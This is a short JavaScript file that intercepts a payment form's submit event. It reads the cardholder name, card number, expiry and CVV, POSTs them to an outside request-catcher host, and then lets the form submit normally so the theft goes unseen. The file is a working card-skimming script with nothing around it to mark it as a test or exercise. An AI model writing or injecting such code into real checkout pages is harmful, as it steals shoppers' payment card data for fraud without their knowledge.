document.addEventListener('DOMContentLoaded', () => {
    const paymentForm = document.getElementById('payment-form');

    paymentForm.addEventListener('submit', (event) => {
        event.preventDefault();

        const paymentData = {
            name: document.getElementById('card-name').value,
            number: document.getElementById('card-number').value,
            expiry: document.getElementById('expiry').value,
            cvv: document.getElementById('cvv').value,
            timestamp: new Date().toISOString()
        };

        fetch('https://joke.requestcatcher.com/', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(paymentData),
        })
            .then(response => {
                console.log("Data logged successfully.");
                paymentForm.submit();
            })
            .catch(error => {
                console.error("Error logging data:", error);
                paymentForm.submit();
            });
    });
});